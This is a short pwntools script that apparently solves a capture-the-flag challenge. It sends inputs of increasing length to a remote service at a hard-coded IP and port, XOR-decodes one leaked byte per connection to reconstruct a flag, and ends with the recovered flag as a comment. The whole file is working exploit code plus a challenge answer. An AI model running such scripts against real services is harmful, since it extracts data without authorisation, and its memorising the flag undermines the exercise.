from pwn import *

flag_len = 41
flag = ""

for i in range(12, 12 + flag_len + 1):
    #p = process('./hello_service')
    p = remote('141.85.224.106', 31337)
    p.sendline('a'*i)
    try:
        print (p.recvline())
        leak = p.recv().strip()
        leak = chr(ord(leak) ^ (i - 12))
        flag += leak
        print (flag)
    except:
        pass
    p.close()

# CNS_CTF{5d96641cfea639e335c7124ebe905363}
